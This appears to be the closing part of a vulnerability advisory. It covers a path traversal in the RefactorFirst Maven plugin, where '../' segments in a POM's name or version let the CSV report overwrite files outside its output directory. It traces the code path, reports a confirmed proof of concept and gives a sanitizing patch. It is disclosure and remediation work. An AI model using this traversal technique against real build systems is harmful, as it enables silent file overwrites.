### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:21`

`pathname = reportOutputDirectory + File.separator + filename` — raw string concatenation (not
`new File(parent, child)`): `/` inside the filename creates real path components, so `..` segments in `<name>`/
`<version>` traverse out of the output directory.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:26-35`

`createNewFile()` (no parents created; returns false without error if the target exists) then
`Files.newBufferedWriter(...)` (default CREATE|TRUNCATE|WRITE, follows symlinks) — the out-of-scope file is
created/overwritten; all IOExceptions are caught and only logged, so the write is silent to the victim.

### Step 9 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java:24-47`

Mojo-side source: `@Parameter(defaultValue = "${project.name}")` / `${project.version}` are interpolated from the
analyzed project's model (`<name>` is unvalidated display text in every Maven 3.x) and passed to the same `CsvReport`
composition; the output directory here is the analyzed POM's own `<reporting><outputDirectory>` (see the sibling
output-directory finding). Dynamically verified (POC): Maven 3.8.7 model building accepts a `<name>` full of `../..`
segments with zero warnings (BUILD SUCCESS), and the reporting outputDirectory reaches `CsvReport.execute` already
interpolated to the absolute `<basedir>/target/site`, so the mojo's
`.replace("${project.basedir}" + File.separator, "")` never matches — the traversal chain on the mojo path must simply
span the two extra levels below the repo root. Both entry points (CLI `-t CSV`, `csvreport` goal) were reproduced
writing an attacker-named, attacker-authored CSV outside the output directory, silently (process exit code 0), with the
write confirmed at the openat () syscall level by strace.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java @@ -21,14 +21,18 @@ public class CsvReport { public
void execute (boolean showDetails, String projectName, String projectVersion, String outputDirectory, File baseDir) {
StringBuilder fileNameSB = new StringBuilder (); String publishedDate = createFileDateTimeFormatter ().format
(Instant.now ());

         fileNameSB
                 .append(getOutputNamePrefix())
                 .append("_P")

-                .append(projectName)

+                .append(sanitizeFilenameSegment(projectName))
                 .append("_PV")

-                .append(projectVersion)

+                .append(sanitizeFilenameSegment(projectVersion))
                 .append("_PD")
                 .append(publishedDate)
                 .append(".csv");
         String filename = fileNameSB.toString();

@@ -214,6 +218,17 @@ public class CsvReport { public String getOutputNamePrefix () { // This report will generate
simple-report.html when invoked in a project with `mvn site`
return "RefFirst"; }

+
+ /**
+     * The analyzed POM is untrusted input: <name>/<version> must never contribute path
+     * separators or traversal segments to the output filename (CWE-22).
+     */
+ static String sanitizeFilenameSegment (String value) {
+        if (value == null || value.isBlank()) {
+            return "unknown";
+        }
+        return value.replaceAll("[^\\w.-]", "_").replaceAll("\\.{2,}", "_");
+ }

  public String getName (Locale locale) { // Name of the report when listed in the project-reports.html page of a
  project

## References

- https://cwe.mitre.org/data/definitions/22.html
- https://cwe.mitre.org/data/definitions/73.html
- https://issues.apache.org/jira/browse/MRRESOURCES-91 (maven-remote-resources-plugin path traversal, analogous
  untrusted-POM → output-path class)

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

